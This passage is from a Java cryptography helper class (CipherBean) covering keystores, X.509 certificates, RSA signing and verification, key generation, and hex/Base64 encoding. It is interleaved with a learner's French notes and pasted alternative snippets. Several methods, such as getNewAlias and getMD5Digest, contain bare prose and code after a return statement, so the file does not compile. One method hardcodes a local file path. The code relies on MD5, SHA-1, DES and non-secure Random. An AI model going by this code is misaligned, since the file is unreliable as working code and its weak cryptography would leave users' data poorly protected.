                                                                        	 * 
                                                                        	 * @param in
                                                                        	 *            the in
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the bytes from encoded string
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	public final static byte[] getBytesFromEncodedString(String in, String... format)
                                                                        			throws IOException {
                                                                        		byte[] returnBytes = null;
                                                                        		if (format.length == 0 || format[0].equals(B64)) {
                                                                        			returnBytes = fromBase64(in);
                                                                        		} else if (format.length > 0 && format[0].equals(HEX)) {
                                                                        			returnBytes = hexToBinary(in);
                                                                        		} else if (format.length > 0 && format[0].equals(HES)) {
                                                                        			returnBytes = signedHexToBinary(in);
                                                                        		}
                                                                        		return returnBytes;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the encoded string from bytes.
                                                                        	 * 
                                                                        	 * @param in
                                                                        	 *            the in
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the encoded string from bytes
                                                                        	 */
                                                                        	public static String getEncodedStringFromBytes(byte[] in, String... format) {
                                                                        		String returnBytes = null;
                                                                        		if (format.length == 0 || format[0].equals(B64)) {
                                                                        			returnBytes = toBase64(in);
                                                                        		} else if (format.length > 0 && format[0].equals(B64C)) {
                                                                        			returnBytes = toBase64(in, true);
                                                                        		} else if (format.length > 0 && format[0].equals(HEX)) {
                                                                        			returnBytes = binaryToHex(in);
                                                                        		} else if (format.length > 0 && format[0].equals(HES)) {
                                                                        			returnBytes = binaryToSignedHex(in);
                                                                        		}
                                                                        		return returnBytes;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the first alias embedded certificate.
                                                                        	 *
                                                                        	 * @param keyStore the key store
                                                                        	 * @return the first alias embedded certificate
                                                                        	 * @throws KeyStoreException the key store exception
                                                                        	 */
                                                                        	public static String getFirstAliasEmbeddedCertificate(KeyStore keyStore)
                                                                        			throws KeyStoreException {
                                                                        		String certAlias = null;
                                                                        		/* get the first certificate private key found */
                                                                        		for (Enumeration<String> enumCertificates = keyStore.aliases(); enumCertificates.hasMoreElements();) 
                                                                        		{
                                                                        			String alias = (String) enumCertificates.nextElement();
                                                                        			if (keyStore.isKeyEntry(alias)) {
                                                                        				certAlias = alias;
                                                                        				break;
                                                                        			}
                                                                        		}
                                                                        		return certAlias;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the key pair.
                                                                        	 * 
                                                                        	 * @param algo
                                                                        	 *            the algo
                                                                        	 * @return the key pair
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 */
                                                                        	static KeyPair getKeyPair(String algo)
                                                                        			throws NoSuchAlgorithmException {
                                                                        		KeyPairGenerator generator = KeyPairGenerator.getInstance(algo);
                                                                        		generator.initialize(RSA_LENGTH);
                                                                        		return generator.generateKeyPair();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the key store from p12.
                                                                        	 * 
                                                                        	 * @param keyStore
                                                                        	 *            the key store
                                                                        	 * @param certPsw
                                                                        	 *            the cert psw
                                                                        	 * @return the key store from .p12
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws CertificateException
                                                                        	 *             the certificate exception
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	public static KeyStore getKeyStoreFromP12(File keyStore, String certPsw)
                                                                        			throws KeyStoreException, NoSuchAlgorithmException,
                                                                        			CertificateException, IOException {
                                                                        		KeyStore kStore = null;
                                                                        		KeyStore.getInstance(getKsType());
                                                                        		if (keyStore.exists()) {
                                                                        			kStore = KeyStore.getInstance(getKsType());
                                                                        			FileInputStream fis = new FileInputStream(keyStore);
                                                                        			kStore.load(fis, certPsw.toCharArray());
                                                                        			if (fis != null) {
                                                                        				fis.close();
                                                                        			}
                                                                        		}
                                                                        		return kStore;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the key store path.
                                                                        	 * 
                                                                        	 * @return the key store path
                                                                        	 */
                                                                        	private static String getKeyStorePath() {
                                                                        		return keyStorePath;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the key store psw.
                                                                        	 * 
                                                                        	 * @return the key store psw
                                                                        	 */
                                                                        	private static String getKeyStorePsw() {
                                                                        		return keyStorePsw;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the ks type.
                                                                        	 * 
                                                                        	 * @return the ks type
                                                                        	 */
                                                                        	public static String getKsType() {
                                                                        		return ksType;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the new alias.
                                                                        	 * 
                                                                        	 * @return the new alias
                                                                        	 */
                                                                        	private static String getNewAlias() {// pour generer un chiffre aleatoire au hasard  voir LINK_haqsdfsaqsdfrd
                                                                        		return Integer.toString(random.nextInt(Integer.MAX_VALUE))   // si Integer.MAX_VALUE cest 3 par ex random va etre soit 0, 1, ou 2
                                                                        				+ Long.toString(Calendar.getInstance().getTime().getTime());
                                                                        				
                                                                        				ou bien(encore mieux)  voir aussi generer nombre aleatoire hasard LINK_haqsdfsaqsdfrd  
                                                                        				SecureRandom random = new SecureRandom();
                                                                        				byte sessBytes[]=new byte[32];
                                                                        				random.nextBytes(sessBytes);
                                                                        				String nombre = new String(sessBytes);
                                                                        				ou 
                                                                        				SecureRandom random = new SecureRandom();
                                                                                String idString = "_"+random.nextInt(100000)+"_" + random.nextInt(100000)+ "_" + random.nextInt(100000);
                                                                        				
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the secret key.
                                                                        	 * 
                                                                        	 * @param algo
                                                                        	 *            the algo
                                                                        	 * @return the secret key
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 */
                                                                        	static SecretKey getSecretKey(String algo)
                                                                        			throws NoSuchAlgorithmException {
                                                                        		javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator
                                                                        				.getInstance(algo);
                                                                        		SecretKey sk = null;
                                                                        		if (algo.equals(AES_ALK)) {
                                                                        			kgen.init(AES_LENGTH);
                                                                        		} else if (algo.equals(DES_ALK)) {
                                                                        			kgen.init(DES_LENGTH);
                                                                        		}
                                                                        		sk = kgen.generateKey();
                                                                        		return sk;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the signature. COMPRIS
                                                                        	 * 
                                                                        	 * @return the signature
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 */
                                                                        	private static Signature getSignature() throws NoSuchAlgorithmException {
                                                                        		synchronized (CipherBean.class) {
                                                                        			if (signature == null) {
                                                                        				signature = Signature.getInstance(SIGN_ALGO1);
                                                                        			}
                                                                        		}
                                                                        		return signature;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the x509 certificate corresponding to file.
                                                                        	 * 
                                                                        	 * @param filename
                                                                        	 *            the filename
                                                                        	 * 
                                                                        	 * @return the x509 certificate
                                                                        	 */
                                                                        	public static X509Certificate getX509Certificate(final String filename) {
                                                                        		X509Certificate cert = null;
                                                                        		try {
                                                                        			final FileInputStream fis = new FileInputStream(filename); //chemin absolu necessaire
                                                                        			final BufferedInputStream bis = new BufferedInputStream(fis);
                                                                        			final CertificateFactory cf = CertificateFactory.getInstance("X.509");
                                                                        			while (bis.available() > 0) {
                                                                        				cert = (X509Certificate) cf.generateCertificate(bis);
                                                                        				log(Priority.INFO, cert.toString());
                                                                        			}
                                                                        		} catch (final Exception e) {
                                                                        			// TODO Bloc catch auto-genere
                                                                        			log(Priority.ERROR, e.getClass().getCanonicalName()
                                                                        					+ " - getX509Certificate() : " + e.getMessage());
                                                                        		}
                                                                        		return cert;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Hex to binary.
                                                                        	 * 
                                                                        	 * Decodes a hex string into a byte array
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * @return the byte[]
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	private static byte[] hexToBinary(String bytes) throws IOException {
                                                                        		final int base16 = 16;
                                                                        		final int byteLength = 256;
                                                                        		String wbytes = bytes;
                                                                        		if ((wbytes.length() % 2) != 0) {
                                                                        			wbytes += "0";
                                                                        		}
                                                                        		byte[] b1 = new byte[wbytes.length() / 2];
                                                                        		for (int i = 0; i < wbytes.length(); i += 2) {
                                                                        			try {
                                                                        				b1[i / 2] = Byte.decode("0x" + wbytes.substring(i, i + 2))
                                                                        						.byteValue();
                                                                        			} catch (Exception e) {
                                                                        				b1[i / 2] = (byte) (Integer.parseInt(
                                                                        						wbytes.substring(i, i + 2), base16) - byteLength);
                                                                        			}
                                                                        		}
                                                                        		return b1;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the m d5 digest.
                                                                        	 *
                                                                        	 * @param bytes the bytes
                                                                        	 * @return the m d5 digest
                                                                        	 * @throws IOException Signals that an I/O exception has occurred.
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception // pour recuperer le hash d'un truc. pour hasher avec md5
                                                                        	 */
                                                                        	public static byte[] getMD5Digest(InputStream bytes) throws IOException, NoSuchAlgorithmException {      
                                                                        		MessageDigest msgDigest = java.security.MessageDigest.getInstance("MD5"); ou MessageDigest.getInstance("SHA-1")
                                                                        		int l;
                                                                                byte[] buffer = new byte[1024];
                                                                                while ((l=bytes.read(buffer))>-1) {
                                                                                	msgDigest.update(buffer, 0, l);
                                                                                }
                                                                                bytes.close();
                                                                                return msgDigest.digest(); 
                                                                                
                                                                                // pour hasher le contenu d'un ficheir avec md5
                                                                                            java.io.File file = new java.io.File("D:/Profiles/lduverge/workspace/wenhuaduvergeamazonfeed/src/main/resources/FeedSample.xml");
                                                                                            java.io.FileInputStream fis = new java.io.FileInputStream(file);
                                                                                            java.security.DigestInputStream dis = new java.security.DigestInputStream( fis, java.security.MessageDigest.getInstance( "MD5" ));
                                                                                            byte[] buffer = new byte[8192];
                                                                                            while( dis.read( buffer ) > 0 )
                                                                                                contentMD5 = new String( org.apache.commons.codec.binary.Base64.encodeBase64(dis.getMessageDigest().digest()) );
                                                                                            System.out.println("contentMD5……"+contentMD5);

                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Import pfx certificate.
                                                                        	 * 
                                                                        	 * @param fileName
                                                                        	 *            the file name
                                                                        	 * @param psw
                                                                        	 *            the psw
                                                                        	 * @param alias
                                                                        	 *            the alias
                                                                        	 * @return the string
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws CertificateException
                                                                        	 *             the certificate exception
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 * @throws UnrecoverableKeyException
                                                                        	 *             the unrecoverable key exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 */
                                                                        	@SuppressWarnings("unused")
                                                                        	private static String importPfxCertificate(String fileName, String psw,
                                                                        			String alias) throws KeyStoreException, NoSuchAlgorithmException,
                                                                        			CertificateException, IOException, UnrecoverableKeyException,
                                                                        			CipherException {
                                                                        		KeyStore kspkcs12 = KeyStore.getInstance("PKCS12");
                                                                        		kspkcs12.load(new FileInputStream(fileName), psw.toCharArray());
                                                                        		String pkcs12Alias = null;
                                                                        		for (Enumeration<String> enum1 = kspkcs12.aliases(); enum1
                                                                        				.hasMoreElements();) {
                                                                        			pkcs12Alias = (String) enum1.nextElement();
                                                                        			break;
                                                                        		}
                                                                        		if (kspkcs12 != null && kspkcs12.isKeyEntry(pkcs12Alias) && ks != null) {
                                                                        			ks.setKeyEntry(alias != null ? alias : pkcs12Alias, kspkcs12
                                                                        					.getKey(pkcs12Alias, psw.toCharArray()), psw.toCharArray(),
                                                                        					kspkcs12.getCertificateChain(pkcs12Alias));
                                                                        			saveKeyStore(getKeyStorePath(), getKeyStorePsw());
                                                                        		} else {
                                                                        			throw new CipherException("Unable to import this certificate !");
                                                                        		}
                                                                        		return alias != null ? alias : pkcs12Alias;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Inits the bean.
                                                                        	 * 
                                                                        	 * Retrieves keystore or create it.
                                                                        	 * 
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws CertificateException
                                                                        	 *             the certificate exception
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	private static void init() throws CipherException, KeyStoreException,
                                                                        			NoSuchAlgorithmException, CertificateException, IOException {
                                                                        		synchronized (CipherBean.class) {
                                                                        			if (ks == null) {
                                                                        				if (getKeyStorePath() != null || getKeyStorePsw() != null) {
                                                                        					CipherBean.saveKeyStore(getKeyStorePath(),
                                                                        							getKeyStorePsw());
                                                                        				}
                                                                        				// else {
                                                                        				// throw new CipherException(
                                                                        				// "Please supply KeyStore path and password before proceeding");
                                                                        				// }
                                                                        			}
                                                                        		}
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Log onto System.out or log4j appender.
                                                                        	 * 
                                                                        	 * @param priority
                                                                        	 *            the priority
                                                                        	 * @param message
                                                                        	 *            the message
                                                                        	 */
                                                                        	private static void log(Priority priority, String message) {
                                                                        		if (log.getAllAppenders().hasMoreElements()) {
                                                                        			log.log(priority, message);
                                                                        		}
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Save key store.
                                                                        	 *
                                                                        	 * @param theKeyStorePath the key store path
                                                                        	 * @param theKeyStorePsw the key store psw
                                                                        	 * @throws KeyStoreException the key store exception
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws CertificateException the certificate exception
                                                                        	 * @throws IOException Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	private static void saveKeyStore(String theKeyStorePath,
                                                                        			String theKeyStorePsw) throws KeyStoreException,
                                                                        			NoSuchAlgorithmException, CertificateException, IOException {
                                                                        		File f = new File(theKeyStorePath);
                                                                        		synchronized (CipherBean.class) {
                                                                        			if (ks == null) {
                                                                        				ks = KeyStore.getInstance(getKsType());
                                                                        				FileInputStream fis = f.exists() ? new FileInputStream(f)
                                                                        						: null;
                                                                        				ks.load(fis, theKeyStorePsw.toCharArray());
                                                                        				if (fis != null) {
                                                                        					fis.close();
                                                                        				}
                                                                        			}
                                                                        		}
                                                                        		FileOutputStream fos = new FileOutputStream(f); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                                                                        		ks.store(fos, theKeyStorePsw.toCharArray());
                                                                        		fos.close();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Save key store entry.
                                                                        	 * 
                                                                        	 * @param entry
                                                                        	 *            the entry
                                                                        	 * @param givenAlias
                                                                        	 *            the given alias
                                                                        	 * @return the string
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws CertificateException
                                                                        	 *             the certificate exception
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	@SuppressWarnings("unused")
                                                                        	private static String saveKeyStoreEntry(Object entry, String... givenAlias)
                                                                        			throws KeyStoreException, NoSuchAlgorithmException,
                                                                        			CertificateException, IOException {
                                                                        		String alias = givenAlias.length > 0 ? givenAlias[0] : null;
                                                                        		if (entry instanceof X509Certificate) {
                                                                        			if (!ks.isCertificateEntry(((X509Certificate) entry).getSubjectDN()
                                                                        					.getName())) {
                                                                        				ks.setCertificateEntry(((X509Certificate) entry).getSubjectDN()
                                                                        						.getName(), (X509Certificate) entry);
                                                                        			}
                                                                        			if (alias == null) {
                                                                        				alias = ((X509Certificate) entry).getSubjectDN().getName();
                                                                        			}
                                                                        		} else if (entry instanceof SecretKey) {
                                                                        			if (alias == null) {
                                                                        				alias = getNewAlias();
                                                                        			}
                                                                        			ks.setKeyEntry(alias, (SecretKey) entry, getKeyStorePsw()
                                                                        					.toCharArray(), null);
                                                                        		}
                                                                        		saveKeyStore(getKeyStorePath(), getKeyStorePsw());
                                                                        		return alias;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sets the charset.
                                                                        	 * 
                                                                        	 * @param newcharset
                                                                        	 *            the new charset
                                                                        	 */
                                                                        	public static void setCharset(String newcharset) {
                                                                        		charset = newcharset;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sets the key store path.
                                                                        	 * 
                                                                        	 * @param path
                                                                        	 *            the new key store path
                                                                        	 * @throws FileNotFoundException
                                                                        	 *             the file not found exception
                                                                        	 */
                                                                        	public static void setKeyStorePath(String path)
                                                                        			throws FileNotFoundException {
                                                                        		File fKeystore = new File(path);
                                                                        		keyStorePath = fKeystore.getAbsolutePath();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sets the key store psw.
                                                                        	 * 
                                                                        	 * @param string
                                                                        	 *            the string
                                                                        	 */
                                                                        	public static void setKeyStorePsw(String string) {
                                                                        		keyStorePsw = string;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sets the ks type.
                                                                        	 * 
                                                                        	 * @param ksType
                                                                        	 *            the new ks type
                                                                        	 */
                                                                        	public static void setKsType(String ksType) {
                                                                        		CipherBean.ksType = ksType;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign.         COMPRIS
                                                                        	 *
                                                                        	 * @param data the data
                                                                        	 * @param privateKey the private key
                                                                        	 * @return the byte[]
                                                                        	 * @throws SignatureException the signature exception
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws UnsupportedEncodingException the unsupported encoding exception
                                                                        	 * @throws InvalidKeyException the invalid key exception
                                                                        	 */
                                                                        	private static byte[] sign(byte[] data, PrivateKey privateKey)
                                                                        			throws SignatureException, NoSuchAlgorithmException,
                                                                        			UnsupportedEncodingException, InvalidKeyException {
                                                                        		getSignature().initSign(privateKey);
                                                                        		/* Update and sign the data */
                                                                        		getSignature().update(data);
                                                                        		return getSignature().sign();
                                                                        	}
                                                                        	
                                                                        	/**
                                                                        	 * Sign.                COMPRIS
                                                                        	 *
                                                                        	 * @param data the data
                                                                        	 * @param privateKey the private key
                                                                        	 * @return the byte[]
                                                                        	 * @throws SignatureException the signature exception
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws InvalidKeyException the invalid key exception
                                                                        	 * @throws IOException 
                                                                        	 */
                                                                        	private static byte[] sign(InputStream ins, PrivateKey privateKey)
                                                                        			throws SignatureException, NoSuchAlgorithmException,
                                                                        			InvalidKeyException, IOException {
                                                                        		byte[] bytes = new byte[1024];
                                                                        		int i;
                                                                        		getSignature().initSign(privateKey);
                                                                        		/* Update and sign the data */
                                                                        		while ((i=ins.read(bytes, 0, bytes.length))>-1) {
                                                                        			getSignature().update(bytes, 0, i);			
                                                                        		}
                                                                        		ins.close();
                                                                        		return getSignature().sign();
                                                                        	}
                                                                        	
                                                                        	/**
                                                                        	 * Sign.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param keyStore
                                                                        	 *            the key store
                                                                        	 * @param certPsw
                                                                        	 *            the cert psw
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the string
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 */
                                                                        	public static String sign(String data, KeyStore keyStore, String certPsw,
                                                                        			String... format) throws CipherException {
                                                                        		try {
                                                                        			String certAlias = getFirstAliasEmbeddedCertificate(keyStore);
                                                                        			return sign(data, (PrivateKey) keyStore.getKey(certAlias, certPsw
                                                                        					.toCharArray()), format);
                                                                        		} catch (InvalidKeyException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (UnrecoverableKeyException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (KeyStoreException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (SignatureException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (NoSuchAlgorithmException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (UnsupportedEncodingException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		}
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param privateKey
                                                                        	 *            the private key
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the string
                                                                        	 * @throws SignatureException
                                                                        	 *             the signature exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws UnsupportedEncodingException
                                                                        	 *             the unsupported encoding exception
                                                                        	 * @throws InvalidKeyException
                                                                        	 *             the invalid key exception
                                                                        	 */
                                                                        	private static String sign(String data, PrivateKey privateKey,
                                                                        			String... format) throws SignatureException,
                                                                        			NoSuchAlgorithmException, UnsupportedEncodingException,
                                                                        			InvalidKeyException {
                                                                        		return getEncodedStringFromBytes(sign(data.getBytes(charset),
                                                                        				privateKey), format);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Hex to binary.
                                                                        	 * 
                                                                        	 * Decode a signed hex String into a byte array.
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * @return the byte[]
                                                                        	 */
                                                                        	private static byte[] signedHexToBinary(String bytes) {
                                                                        		java.util.StringTokenizer st = new java.util.StringTokenizer(bytes); // déconseillé d'utiliser StringTokenizer. préférer split ou java.util.regex LINKs.sp.it
                                                                        		byte[] b1 = new byte[bytes.length() / 2];
                                                                        		String s;
                                                                        		int i = 0;
                                                                        		while (st.hasMoreTokens()) {
                                                                        			s = st.nextToken();
                                                                        			b1[i++] = Byte.decode(
                                                                        					(s.charAt(0) == '-' ? "-0x" + s.substring(1) : "0x" + s))
                                                                        					.byteValue();
                                                                        		}
                                                                        		byte[] b2 = new byte[i];
                                                                        		System.arraycopy(b1, 0, b2, 0, b2.length);
                                                                        		return b2;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign verify.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param dataSignature
                                                                        	 *            the data signature
                                                                        	 * @param certificate
                                                                        	 *            the certificate
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return true, if successful
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 */
                                                                        	public static boolean signVerify(String data, String dataSignature,
                                                                        			Certificate certificate, String... format) throws CipherException {
                                                                        		try {
                                                                        			return verify(data.getBytes(charset), getBytesFromEncodedString(
                                                                        					dataSignature, format), certificate);
                                                                        		} catch (UnsupportedEncodingException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (IOException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		}
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign verify.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param dataSignature
                                                                        	 *            the data signature
                                                                        	 * @param keyStore
                                                                        	 *            the key store
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return true, if successful
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 */
                                                                        	public static boolean signVerify(String data, String dataSignature,
                                                                        			KeyStore keyStore, String... format) throws KeyStoreException,
                                                                        			CipherException {
                                                                        		/* get the first certificate private key found */
                                                                        		String certAlias = getFirstAliasEmbeddedCertificate(keyStore);
                                                                        		Certificate certif = keyStore.getCertificate(certAlias);
                                                                        		return certif != null?signVerify(data, dataSignature, certif):false;
                                                                        	}
                                                                        
                                                                        	public static boolean signVerify(InputStream data, InputStream dataSignature,
                                                                        			KeyStore keyStore, String... format) throws KeyStoreException,
                                                                        			CipherException, IOException {
                                                                        		/* get the first certificate private key found */
                                                                        		String certAlias = getFirstAliasEmbeddedCertificate(keyStore);
                                                                        		Certificate certif = keyStore.getCertificate(certAlias);
                                                                        		return certif != null?verify(data, dataSignature, certif):false;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * To base64.
                                                                        	 * 
                                                                        	 * @param bytes
                                                                        	 *            the bytes
                                                                        	 * 
                                                                        	 * @return the string
                                                                        	 */
                                                                        	private static String toBase64(byte[] bytes,boolean... chunkit) {
                                                                        		// return bb64e.encode(bytes);
                                                                        		boolean chunk = false;
                                                                        		if (chunkit.length > 0) {
                                                                        			chunk = chunkit[0];
                                                                        		}
                                                                         		return new String(Base64.encodeBase64(bytes, chunk));
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Verify. COMPRIS
                                                                        	 *
                                                                        	 * @param data the data
                                                                        	 * @param dataSignature the data signature
                                                                        	 * @param certificate the certificate
                                                                        	 * @return true, if successful
                                                                        	 * @throws CipherException the cipher exception
                                                                        	 */
                                                                        	public static boolean verify(byte[] data, byte[] dataSignature,
                                                                        			Certificate certificate) throws CipherException {
                                                                        		try {
                                                                        			/* Initializing the object with the public key */
                                                                        			PublicKey pub = certificate.getPublicKey();
                                                                        			getSignature().initVerify(pub);
                                                                        			/* Update and verify the data */
                                                                        			getSignature().update(data);
                                                                        			return getSignature().verify(dataSignature);
                                                                        		} catch (InvalidKeyException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (NoSuchAlgorithmException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (SignatureException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		}
                                                                        	}
                                                                        	
                                                                        	public static boolean verify(InputStream data, InputStream dataSignature,
                                                                        			Certificate certificate) throws CipherException, IOException {
                                                                        		try {
                                                                        			ByteArrayOutputStream bos = new ByteArrayOutputStream(); 
                                                                        			byte[] bytes = new byte[1024];
                                                                        			int i;
                                                                        			/* Initializing the object with the public key */
                                                                        			PublicKey pub = certificate.getPublicKey();
                                                                        			getSignature().initVerify(pub);
                                                                        			/* Update and verify the data */
                                                                        			while((i=dataSignature.read(bytes, 0, bytes.length))>-1) {
                                                                        				bos.write(bytes, 0, i);
                                                                        			}
                                                                        			bos.close();
                                                                        			while((i=data.read(bytes, 0, bytes.length))>-1) {
                                                                        				getSignature().update(bytes, 0, i);	
                                                                        			}
                                                                        			return getSignature().verify(bos.toByteArray());
                                                                        		} catch (InvalidKeyException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (NoSuchAlgorithmException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		} catch (SignatureException e) {
                                                                        			// TODO Auto-generated catch block
                                                                        			throw new CipherException(e);
                                                                        		}
                                                                        	}
                                                                        	/** The ecipher. */
                                                                        	private transient Cipher ecipher;
                                                                        
                                                                        	/** The dcipher. */
                                                                        	private transient Cipher dcipher;
                                                                        
                                                                        	/** The current alias. */
                                                                        	private transient String currentAlias;
                                                                        
                                                                        	/** The charset of entered string. */
                                                                        	private static transient String charset = "US-ASCII";
                                                                        
                                                                        	/** The current secret key. */
                                                                        	private transient SecretKey currentSecretKey = null;
                                                                        
                                                                        	/**
                                                                        	 * Sets the current secret key.
                                                                        	 *
                                                                        	 * @param secretKey the new current secret key
                                                                        	 */
                                                                        	private void setCurrentSecretKey(SecretKey secretKey) {
                                                                        		this.currentSecretKey = secretKey;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the current secret key.
                                                                        	 *
                                                                        	 * @param certificate the certificate
                                                                        	 * @return the current secret key
                                                                        	 * @throws CipherException the cipher exception
                                                                        	 * @throws UnsupportedEncodingException the unsupported encoding exception
                                                                        	 * @throws IllegalBlockSizeException the illegal block size exception
                                                                        	 * @throws BadPaddingException the bad padding exception
                                                                        	 * @throws InvalidKeyException the invalid key exception
                                                                        	 * @throws UnrecoverableKeyException the unrecoverable key exception
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws NoSuchPaddingException the no such padding exception
                                                                        	 * @throws KeyStoreException the key store exception
                                                                        	 */
                                                                        	public String getCurrentSecretKey(Certificate certificate)
                                                                        			throws CipherException, UnsupportedEncodingException,
                                                                        			IllegalBlockSizeException, BadPaddingException, InvalidKeyException, UnrecoverableKeyException, NoSuchAlgorithmException, NoSuchPaddingException, KeyStoreException {
                                                                        		return (new CipherBean(certificate)).cipher(getEncodedStringFromBytes(getIv(), HEX)+getEncodedStringFromBytes(currentSecretKey.getEncoded(), HEX), B64C);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Instantiates a new cipher.
                                                                        	 */
                                                                        	CipherBean() {
                                                                        		super();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Instantiates a new cipher with a RSA keypair.
                                                                        	 * 
                                                                        	 * @param keys
                                                                        	 *            the keys
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws NoSuchPaddingException
                                                                        	 *             the no such padding exception
                                                                        	 * @throws InvalidKeyException
